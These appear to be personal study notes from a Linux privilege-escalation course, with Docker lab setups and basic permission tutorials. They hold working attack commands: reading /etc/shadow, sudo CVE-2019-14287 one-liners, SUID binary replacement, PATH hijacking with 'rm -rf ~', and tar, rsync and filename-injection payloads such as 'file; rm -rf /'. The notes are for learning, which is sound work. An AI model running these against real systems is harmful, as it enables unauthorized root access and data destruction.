ps aux - services that is running

#user enum:
---------------------
sudo -l
cat etc/passwd
cat etc/shadow
cat etc/group
history

#network enum:
-------------------
ifconfig
ip a
route
ip neigh
netstat -ano

#password enum
---------------------
grep --color=auto -rnw '/' -ie "PASSWORD=" --color=always 2> /dev/null
locate passwoed | more
find / -name id_rsa 2> /dev/null

#automated tools
----------------------
linpeas
linEnum
suggester
privchecker

#kernel exploit
----------------------
github->kernel exploit
uname -a
-exploit database
-suggester

#passwords&File Persmission:
----------------------------
#Escalation via stored passwrords
history
su root
github->payloadsAllTheThings->looting passwd
linpeas

#Escalation via weak file permissions:
----------------------------------------
ls -la /etc/passwd
ls -la /etc/shadow
Terminal command -> unshadow passwd shadow
hashcat.net -> finding hashing type

#Escalation via SSH key:
----------------------------
github -> payloadofallthings -> linux escation
find / -name authorized_keys 2> /dev/null
find / -name id_rsa 2> /dev/null
ssh-keygen -> to gen key
after u get id_rsa:
-gedit id_rsa
-chmod 600 id_rsa
-ssh -i id_rsa root@192.168.4.67

#Escalation via sudo shell escaping
---------------------------------------
-sudo -l
-gtfobins

#Escalation via intended functionality
-----------------------------------------
-functionality example apache

#Escalation via LD_PRELOAD:
-------------------------------
sudo -l
article->https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/

#Escalation via CVE-2019-14287
---------------------------------
sudo -l
sudo -u#-1 /bin/bash
sudo -u#4294967295 /bin/bash

#Escalation via CVE-2019-18634
------------------------------
-sudo buffer overlow
sudo -l
cat /etc/sudoers
pwfeedback -> if its enabled in passwd("*")
Segmentation fault - shows buffer ovlew exploitations exist
source code - https://github.com/saleemrashid/sudo-cve-2019-18634
gcc -o exploit exploit.c
sudo -v

#SUID
---------------
chmod
find / -perm -u=s -type f 2>/dev/null
gtfobins
tryhackme-> vulnervity 

============================================
intro to linux shell
---------------------
user <--> xterm <--> tty <--> bash

* relative and absolute path

---------------------------------
lab creation
---------------------------------
--Dockerfile--
FROM ubuntu:latest
RUN apt-get update && apt-get install -y openssh-server sudo
RUN useradd -rm -d /home/sshuser -s /bin/bash -g root -G sudo sshuser
RUN echo "sshuser:password" | chpasswd
RUN mkdir /var/run/sshd
EXPOSE 22

CMD ["/usr/sbin/sshd", "-D"]

-sudo docker build -t ssh-lab .
-sudo docker run --name ssh-lab --rm -p 22:22 -d ssh-lab
-sudo docker ps  
-sudo docker exec -u root -t -i ssh-lab /bin/bash
-ssh -o "UserKnownHostsFile=/dev/null" sshuser@127.0.01


------------
CMD
------------
-hostname
-pwd
-id
-whoami
-env
-echo $SHELL
-which

---------------------
Resource management
---------------------
fdisk -l
df -h
du -h
ps
ps aux
ps axjf
ip address
ip a
netstat -ltp

sudo useradd -m <username>
sudo passwd <username>
sudo userdel -r <username>
groups <username>
groupadd <groupname>
usermod -a -G <groupname> <username>

apt-get install fdisk
apt search disk
apt-get purge fdisk
apt-get update


------------------------------
linux file system permissions
------------------------------
man - manual page e.g man ls

file
->Read (r): Permission to view the contents of the file.
->Write (w): Permission to modify the file or directory (e.g., editing, creating, or deleting files).
->Execute (x): Permission to run a file as a program or script.

->The first character indicates whether it's a regular file (-) or a directory (d).

Octal Representation of Permissions:
r (read) = 4
w (write) = 2
x (execute) = 1

1. Symbolic Mode

In symbolic mode, you use letters (r, w, x) and operators (+, -, =) to modify permissions.

    Add permission: chmod +x file (adds execute permission)
    Remove permission: chmod -x file (removes execute permission)
    Set permission: chmod u+x file (sets execute permission for the user)

e.g chmod u+x,g-w,o=r file
-> This example gives the user execute permission (u+x), removes write permission from the group (g-w), and sets read-only permission for others (o=r).

2. Numeric Mode

In numeric mode, you use a three-digit number to represent permissions for user, group, and other. Each digit represents the sum of permissions:
e.g chmod 754 file
User: rwx (read, write, execute) = 7
Group: r-x (read, execute) = 5
Other: r-- (read-only) = 4

##Changing Ownership##
chown user:group file
e.g chown john:developers file
->This sets the owner of file to john and the group to developers.

##to cjange just owner or just group ##

chown john file   # Changes only the owner
chown :developers file  # Changes only the group

##Common Permission Commands##
Check file permissions: ls -l file
Change permissions: chmod (e.g., chmod 755 file)
Change ownership: chown (e.g., chown user:group file)
Change group ownership: chgrp (e.g., chgrp group file)

##special cases##
*Sticky Bit
-While not directly related to SUID or GUID, the sticky bit is another special permission often used in conjunction.
    -Purpose: Prevents users from deleting or renaming files in a shared directory unless they own the file or directory.
~t~ -> sticky bit and ~s~



1. SUID (Set User ID)
-Purpose: When a file with the SUID bit set is executed, it runs with the privileges of the file's owner, not the user who is executing it.

##How It Works:
    -When SUID is set, the owner's permissions are temporarily inherited during execution.
    -SUID only applies to executable binary files and not scripts.
    -example passwd

##Octal Representation: 4XXX
    -Example: chmod 4755 file sets SUID.
    -File with SUID: -rwsr-xr-x

2. GUID (Set Group ID)

    -Purpose: When a file with the GUID bit set is executed, it runs with the privileges of the file's group, not the user executing it.
    -How It Works:
    *On executable files, the group's permissions are inherited during execution.
    *On directories, it forces all files and subdirectories created within the directory to inherit the directory's group ID.
    
##Octal Representation: 2XXX
    -Example: chmod 2755 file sets GUID.
    -File with GUID: -rwxr-sr-x

##########
EXAMPLES
##########
chmod 4755 file       # SUID
chmod 2755 file       # GUID
chmod 1755 directory  # Sticky Bit
chmod 7755 file       # SUID + GUID + Sticky Bit

8. Summary Table
Octal	SUID	GUID	Sticky	Permissions
4000	✅	❌	❌	SUID only
2000	❌	✅	❌	GUID only
1000	❌	❌	✅	Sticky Bit only
7000	✅	✅	✅	SUID + GUID + Sticky






-----------------------------------
PATH HIJACKING
-----------------------------------
-is a technique where an attacker manipulates the $PATH environment variable to execute malicious scripts or binaries in place of legitimate system commands.

1. How $PATH Works

-The $PATH environment variable defines directories where the shell looks for executable programs. When you type a command like ls, the shell searches through the directories in $PATH sequentially to find the executable.

    -Example $PATH:
	/usr/local/bin:/usr/bin:/bin:/usr/local/sbin:/usr/sbin:/sbin
	-Directories are searched in the order they appear, from left to right.
	-If a malicious file is placed earlier in the $PATH, it will execute instead of the intended command.

2. Path Hijacking Attack Example

i.Preparation:
    -Attacker creates a malicious script named ls:

    echo "rm -rf ~" > /tmp/ls
    chmod +x /tmp/ls

ii.Manipulating $PATH:

    Attacker modifies the $PATH variable to prioritize /tmp:

    export PATH=/tmp:$PATH

iii.Execution:

    When the victim runs ls, the shell executes /tmp/ls instead of /bin/ls, potentially causing harm.

**NOTE** - alias ls
	 - export PATH=.:$PATH --> when create in your current folder then you run it "PATH=.:$PATH ./reader 01.txt"


------------------------
SUID exploitation
------------------------
1.Find SUID Files:

-find / -perm -4000 -type f 2>/dev/null
-find / -perm -u=s -type f 2>/dev/null
-find / -perm -g=s -type f 2>/dev/null


-This command lists all files with the SUID bit set.

2.Recognizing SUID Permissions:

-Example output from ls -l:
-rwsr-xr-x 1 root root 150K Oct 16 15:42 /usr/bin/passwd
-s in the owner's execute position (rws) indicates SUID.

3.Basic Exploitation via SUID:

    -If a SUID binary allows execution of commands or scripts, an attacker can potentially escalate privileges. Example:

    ./vulnerable_binary /bin/bash

    -If the binary runs with root privileges, this might give a root shell.

4.Leverage SUID Misconfigurations:

-Find Writable SUID Files:

find / -perm -4000 -type f -writable 2>/dev/null

-If an SUID file is writable, it can be replaced with a malicious binary.

echo -e '#!/bin/bash\n/bin/bash' > /path/to/suid_file
chmod +x /path/to/suid_file

5.Debugging and Analyzing SUID Binaries:

-Use strace to trace system calls:

strace ./suid_binary

-Check for file or command execution:

ltrace ./suid_binary


- mktemp --> creates temporary files

##gtfobins##
-wget
-hexdump
-ssh-keygen
-emacs and vim   ....etc....




---------------------------
SUDO EXPLOITATION
---------------------------
###############################################
##Dockerfile##
FROM ubuntu:latest
RUN apt-get update
RUN apt-get install sudo nano -y
RUN echo "ubuntu:test" | chpasswd

docker build -t sudo-lab .
docker run -td --name sudo-lab --rm sudo-lab
docker exec -it sudo-lab "/bin/bash"

###############################################

-sudo is a tool that allows users to execute commands with elevated privileges.

1.List User Permissions:

sudo -l

This command shows which commands a user can run with sudo privileges.

i. env_reset

    -Purpose: Clears the environment of potentially harmful variables before running a command.

ii.mail_badpass

    -Purpose: Sends an email notification to the system administrator if an incorrect password is entered during a sudo command.

iii.secure_path

    Value:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
	
	-Purpose: Overrides the PATH environment variable for commands run via sudo, ensuring that only trusted directories are included in the path.


++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

-ALL NOPASSWORD
-pip install *
	setup.py --> sudo /usr/bin/pip install . --upgrade --force-reinstall --break-system-packages

-tar
-base64
	

++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++



-------------------------------------
Wildcard expansion Exploitation
-------------------------------------
-Wildcard Expansion Exploitation in Linux is a method attackers might use to manipulate commands that process file patterns (wildcards like *, ?, [abc]) to gain unauthorized privileges, execute arbitrary commands, or alter the behavior of scripts

-Wildcards: Special characters used to match filenames:

    * matches zero or more characters.
    ? matches a single character.
    [abc] matches any one of the characters inside the brackets.
    [!] this will match any character as long as its not listed between the [and].
    \ used as an escape character i.e to protect a subsequent special character
    {} terms are seperated by commas and each term must be the name of the something wildcard
    
    
-Expansion: When a command containing wildcards is executed, the shell expands the wildcard into a list of matching filenames.

1. Exploiting rm with Wildcards

-When using rm with wildcards, an attacker can create files with special names to manipulate behavior.
-Example:

rm -rf *

An attacker could create a malicious file:

touch "--preserve-root"

When rm runs, the expanded command becomes:

rm -rf --preserve-root *

This could prevent the rm command from functioning as intended.

Mitigation:

    Always use -- to indicate the end of options:

rm -rf -- *


2. Command Injection via tar

The tar command may process filenames that begin with special characters like -- as options.

Example:

tar -cvf archive.tar *

An attacker creates:

touch "--checkpoint=1" "--checkpoint-action=exec=sh"

When expanded, tar executes sh at every checkpoint.

Mitigation:

    Use -- to prevent treating filenames as options:

tar -- -cvf archive.tar *

3. Exploiting Scripts with find

Using find with exec or xargs can be dangerous if filenames contain special characters.

Example:

***find . -type f -not -regex '.*\.\(jpg\|png\|gif\)' -exec bash -c "rm -f {}" \;

find . -type f -exec rm {} \;

An attacker creates a file:

touch "file; rm -rf /;"

When expanded, it could execute:

rm file; rm -rf /

Mitigation:

    Use find with proper quoting:

find . -type f -exec rm '{}' \;


4. Exploiting Scripts with scp or rsync

If wildcards are used in commands like scp or rsync, attackers might execute unauthorized commands by creating malicious files.

2 servers
echo "" > '-e sh shell.txt';
e.g -> rsync -a -e 'ssh -p 2222' *.txt root@localhost:/tmp/
	-> rsync -a -e 'ssh -p 2222' -e sh shell.txt root@localhost:/tmp/

Example: A script:

scp * user@host:/path

An attacker creates:

touch "`shutdown now`"

Mitigation:

    Avoid using wildcards directly in scripts. Use explicit filenames or sanitized input.

5. Exploiting ? (Single Character Matching)

If the script or command uses ? for filename matching, you can create files that deliberately match or avoid this pattern to bypass restrictions.

Example:
A script looks for a specific file pattern like file?.sh:

ls file?.sh

You can create a file filex.sh (where x is a single character) to force the script to process it.

6.Curly Braces {} for Command Injection

Curly braces expand terms separated by commas into multiple arguments. Unsanitized usage can lead to command injection.

Example:
A script processes filenames with:

mv {file1,file2,file3}.txt /destination

You can add a filename like file3.txt; rm -rf / to trigger destructive commands:

touch 'file3.txt; rm -rf /'


7.Escaping and Backslash Exploitation (\)

Backslashes are often used to escape characters but can be abused if commands don't sanitize inputs properly.

Example: Bypassing File Checks
Suppose a script checks for files with exact names:

ls file\?.txt

You can create a file like file?.txt (literal ? character) to evade restrictions.



--------------------------------------
LINUX REVERSE SHELLS
--------------------------------------


















































